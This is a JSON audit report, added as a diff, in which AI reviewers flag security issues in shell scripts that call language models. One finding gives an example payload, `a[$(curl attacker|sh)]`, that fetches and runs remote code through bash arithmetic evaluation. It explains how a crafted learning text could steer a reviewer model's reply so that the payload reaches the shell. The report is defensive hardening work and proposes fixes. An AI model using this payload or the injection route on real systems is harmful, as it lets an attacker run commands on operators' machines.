@@ -1,0 +1,150 @@
+{
+  "findings": [
+    {
+      "severity": "MEDIUM",
+      "category": "injection",
+      "title": "Existing EXIT trap body is re-evaluated while composing the new trap",
+      "file": ".claude/scripts/model-adapter.sh",
+      "line": 668,
+      "anchor": "trap 'rm -f -- \"$err_file\"'\"${prev_exit_body:+; $prev_exit_body}\" EXIT",
+      "description": "The new trap chains `prev_exit_body` by expanding it directly into a `trap` command. If `model-adapter.sh` is called from a shell context that already has an attacker-influenced EXIT trap, the previous handler text is parsed as shell syntax during this assignment path. The code also restores the original trap with `eval \"$prev_exit_trap\"`. This turns inherited trap state into executable input, which is especially risky for a model adapter that handles prompts and credentials.",
+      "recommendation": "Do not parse or concatenate trap source text. Use a cleanup helper function and avoid preserving arbitrary prior traps, or store cleanup in a trap stack implemented with function names controlled by this script. If chaining is required, restrict it to known-safe function identifiers rather than raw trap bodies.",
+      "id": "DISS-001",
+      "id_derived": true,
+      "failure_mode": "The new trap chains `prev_exit_body` by expanding it directly into a `trap` command.",
+      "failure_mode_derived": true,
+      "anchor_status": "out_of_scope",
+      "demotion_reason": "Demoted: anchor not in diff scope",
+      "voice": "gpt-5.5-pro",
+      "answered_by": "codex-headless"
+    },
+    {
+      "id": "DISS-C-001",
+      "severity": "MEDIUM",
+      "category": "injection",
+      "anchor": "review_proposal",
+      "anchor_type": "function",
+      "scope": "diff",
+      "trigger_anchor": "[[ \"$gpt_score\" -lt \"$MIN_ALIGNMENT\" ]]",
+      "cross_file_justification": ".claude/scripts/flatline-validate-learning.sh is the sibling script generated from the same template; this diff applies the identical GPT_MODEL/OPUS_MODEL alias change to it, so it almost certainly contains the same `jq -r '.score'` -> `[[ -lt ]]` sink and should be checked at the same time (full file not provided).",
+      "description": "In .claude/scripts/flatline-proposal-review.sh (diff-touched: model defaults changed to the `reviewer`/`opus` catalog aliases), review_proposal() takes the model's JSON reply, extracts `.score` with `jq -r` (no type check), and then evaluates `[[ \"$gpt_score\" -lt \"$MIN_ALIGNMENT\" ]]` and `[[ \"$opus_score\" -lt ... ]]`. Inside `[[ ]]`, the operands of -lt undergo bash arithmetic evaluation, so a string such as `a[$(curl attacker|sh)]` executes the embedded command. The attacker path is: untrusted learning text (trigger/solution) -> build_review_prompt -> reviewer model -> reply. The reply is parsed with `grep -o '{[^}]*}' | head -1`, which takes the FIRST brace block anywhere in the output, so a learning that embeds `{\"score\":\"a[$(...)]\"}` only needs the model to quote or restate the learning before giving its verdict. The guards do not hold: validate_proposal_review_response failing only triggers log_warning and does not return; the preceding `bc` average computation reports a syntax error to stderr and exits 0, so set -e does not abort before the `[[ -lt ]]` test runs. isolate_content wrapping reduces but does not eliminate prompt-injection likelihood. The sink lines are pre-existing, but the file is in this diff and the change alters which model (and routing path) produces the attacker-influenced output.",
+      "failure_mode": "Arbitrary command execution in the shell of whoever runs the proposal review (operator session or CI), triggered by a crafted learning that survives or steers the reviewer model's output.",
+      "suggested_fix": "Before any arithmetic, validate both scores strictly: `[[ \"$gpt_score\" =~ ^[0-9]{1,4}$ ]] && (( gpt_score <= 1000 )) || return 4`, or extract with `jq -e '.score | select(type==\"number\") | floor'`. Make schema-validation failure fatal (return 4) instead of a warning. Replace `grep -o '{[^}]*}' | head -1` with a proper JSON parse (e.g. `jq -c 'select(type==\"object\")'` on the whole reply or a fenced-block extractor) so attacker-supplied brace blocks in echoed content are not selected. Apply the same fix to flatline-validate-learning.sh.",
+      "anchor_status": "out_of_scope",
+      "demotion_reason": "Demoted: anchor not in diff scope",
+      "voice": "claude-headless",
+      "answered_by": "claude-headless"
+    },
+    {
+      "id": "DISS-C-002",
+      "severity": "LOW",
+      "category": "info-disclosure",
+      "anchor": "err_file=\"$(mktemp \"${TMPDIR:-/tmp}/model-adapter-stderr.XXXXXX\" 2>/dev/null)\" || err_file=\"\"",
+      "anchor_type": "line",
+      "scope": "diff",
+      "trigger_anchor": "result=$(\"$MODEL_INVOKE\" \"${invoke_args[@]}\" 2>\"$err_file\") || exit_code=$?",
+      "cross_file_justification": null,
+      "description": "In .claude/scripts/model-adapter.sh main(), cheval/model-invoke stderr is now written to disk under ${TMPDIR:-/tmp} instead of being discarded. That stream can contain prompt text, provider error bodies, and (under LOA_DEBUG / verbose cheval modes) request metadata. mktemp's 0600 mode is the only protection; the subsequent `2>\"$err_file\"` re-opens by path (no O_NOFOLLOW), so safety also depends on TMPDIR being sticky or private. A SIGKILL between the redirect and `rm -f` leaves the file behind, since the EXIT trap does not run on SIGKILL. The relayed WARN line is truncated with `cut -c1-600` but not sanitised, so terminal control sequences in that stderr line would pass through to the operator's terminal.",
+      "failure_mode": "Residual temp files containing prompt/debug content readable by a local user who gains the operator's uid or a misconfigured shared TMPDIR; low-impact terminal escape injection via the relayed stderr line.",
+      "suggested_fix": "Avoid the on-disk file entirely: `result=$(\"$MODEL_INVOKE\" \"${invoke_args[@]}\" 2> >(grep -F -- 'gemini-headless dispatches agy' | cut -c1-600 | tr -cd '[:print:]\\n' >&2))`. If a file is kept, open it once with `exec {fd}<>\"$err_file\"` and `rm` it immediately, then redirect with `2>&$fd`, which removes both the symlink window and the SIGKILL residue.",
+      "anchor_status": "valid",
+      "voice": "claude-headless",
+      "answered_by": "claude-headless"
+    },
+    {
+      "id": "DISS-C-003",
+      "severity": "LOW",
+      "category": "other",
+      "anchor": "_trap_body",
+      "anchor_type": "function",
+      "scope": "diff",
+      "trigger_anchor": "if [[ -n \"$prev_exit_trap\" ]]; then eval \"$prev_exit_trap\"; else trap - EXIT; fi",
+      "cross_file_justification": null,
+      "description": ".claude/scripts/model-adapter.sh adds two `eval` sites: `_trap_body` runs `eval \"set -- $1\"` on `trap -p EXIT` output, and main() later runs `eval \"$prev_exit_trap\"` to restore it. Today this is safe because bash's `trap -p` emits a single-quoted, re-input-safe string and `set --` in a `$(...)` subshell only assigns positional parameters. It is still an eval of a runtime-constructed string in a script that is both executed and sourced by several orchestrators, and the pattern relies on an undocumented-looking bash guarantee (parent traps visible to `$(trap -p)`). Not exploitable as written; flagged as hardening.",
+      "failure_mode": "A future change that builds the EXIT trap from config or environment, or a shell that does not quote `trap -p` output identically, turns this into a code-execution path with no further review.",
+      "suggested_fix": "Drop the eval-based parser: use the process-substitution approach from SEC-002 so no EXIT trap manipulation is needed, or save/restore traps without eval, e.g. `prev=$(trap -p EXIT); trap 'rm -f -- \"$err_file\"' EXIT; ...; [[ -n $prev ]] && trap \"${prev#trap -- }\" || trap - EXIT` after extracting the body with a `read -r _ _ body _ <<<\"$prev\"`-style parse plus `printf %s` unquoting, or simply require callers not to rely on an inherited EXIT trap and document it.",
+      "anchor_status": "valid",
+      "voice": "claude-headless",
+      "answered_by": "claude-headless"
+    }
+  ],
+  "metadata": {
+    "type": "audit",
+    "model": "gpt-5.5-pro",
+    "sprint_id": "sprint-250",
+    "timestamp": "2026-10-07T01:10:12Z",
+    "tokens_input": 56410,
+    "tokens_output": 19626,
+    "cost_usd": 0,
+    "latency_ms": 32362,
+    "status": "reviewed",
+    "degraded": false,
+    "rejected_count": 0,
+    "rejected_summary": [],
+    "rejected_sidecar": "grimoires/loa/a2a/sprint-250/adversarial-rejected-audit-m1-pins.jsonl",
+    "repaired_count": 0,
+    "schema_enforced": false,
+    "parse_path": "normalized",
+    "repair_budget_exhausted": 0,
+    "repair_skipped_no_hop": 0,
+    "repair_wall_seconds": 0,
+    "repair_wall_budget_seconds": 6000,
+    "repair_hops_skipped": [],
+    "model_attempts": [
+      "gpt-5.5-pro:reviewed"
+    ],
+    "final_model": "gpt-5.5-pro",
+    "companion_voice": {
+      "planned": true,
+      "family": "anthropic",
+      "family_basis": "configured_primary",
+      "chain": [
+        "claude-headless"
+      ],
+      "shared_hops": [
+        "claude-headless"
+      ],
+      "model": "claude-headless",
+      "answered_by": "claude-headless",
+      "status": "succeeded",
+      "failure_class": null,
+      "cost_cents": 0,
+      "attempts": [
+        "claude-headless:reviewed"
+      ],
+      "independent": true,
+      "counted_as": "independent_voice",
+      "primary_succeeded_model": "codex-headless",
+      "rejected_sidecar": null
+    },
+    "rejected_sidecars": [
+      "grimoires/loa/a2a/sprint-250/adversarial-rejected-audit-m1-pins.jsonl"
+    ],
+    "hallucination_filter": {
+      "applied": true,
+      "downgraded": 0
+    },
+    "scope": {
+      "diff_range": null,
+      "diff_oids": null,
+      "diff_sha256": "914f374482be7f6579ff7b3bb1ffb387e2fea5eb33afed8e406491d589561f6d",
+      "run_tag": "m1-pins"
+    }
+  },
+  "verdict_quality": {
+    "consensus_outcome": "consensus",
+    "truncation_waiver_applied": false,
+    "voices_planned": 2,
+    "voices_succeeded": 2,
+    "voices_succeeded_ids": [
+      "codex-headless",
+      "claude-headless"
+    ],
+    "voices_dropped": [],
+    "chain_health": "ok",
+    "confidence_floor": "high",
+    "rationale": "multi-voice aggregate (2/2 succeeded); chain_health=ok",
+    "single_voice_call": false,
+    "status": "APPROVED"
+  }
+}
